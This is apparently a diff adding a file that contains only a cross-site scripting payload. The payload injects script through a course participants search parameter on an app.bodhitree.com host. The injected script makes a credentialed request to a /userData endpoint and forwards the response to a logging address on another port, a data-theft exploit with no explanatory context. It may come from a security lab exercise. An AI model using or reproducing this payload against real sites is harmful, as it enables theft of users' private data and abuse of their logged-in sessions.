@@ -1,0 +1,13 @@
+<script>document.location="http://app.bodhitree.com:30000/participants/?courseid=5&search=
+<script> %09var xhr = new XMLHttpRequest();  
+    %09xhr.onload = function() { 
+    %09%09location='http://localhost:30001/log/key=' + this.responseText;  
+    %09
+    };  
+    
+    %09xhr.open('GET', 'http://app.bodhitree.com:30000/userData', true); 
+    %09xhr.withCredentials = true; 
+    %09xhr.setRequestHeader('origin', 'http://app.bodhitree.com:30000'); 
+    %09xhr.send(); 
+</script>"
+</script>
